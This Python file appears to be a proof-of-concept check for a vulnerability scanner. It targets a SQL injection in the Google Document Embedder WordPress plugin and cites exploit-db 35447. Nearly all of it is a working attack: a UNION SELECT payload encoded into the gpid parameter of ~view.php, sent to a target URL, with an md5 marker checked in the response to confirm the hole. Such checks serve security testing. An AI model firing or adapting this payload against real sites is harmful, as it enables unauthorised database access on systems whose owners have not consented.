#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = ko0zhi
#__Service_ = Wordpress
#__Refer___ = http://www.beebeeto.com/pdb/poc-2014-0174/
#___Type___ = sql
#___name___ = http://www.exploit-db.com/exploits/35447/
'''
Wordpress插件漏洞, Google Document Embedder漏洞
'''

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = "wp-content/plugins/google-document-embedder/~view.php?embedded=1&gpid=0%20UNION%20SELECT%201,2,3,%20CONCAT(CAST(CHAR(97,58,49,58,123,115,58,54,58,34,118,119,95,99,115,115,34,59,115,58)%20as%20CHAR),%20LENGTH(md5(1234)),%20CAST(CHAR(58,%2034)%20as%20CHAR),%20md5(1234),%20CAST(CHAR(34,%2059,%20125)%20as%20CHAR))"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('%s' % url)
    if code ==200 and '77596ce7097c5f353cffcc865487d9e2' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])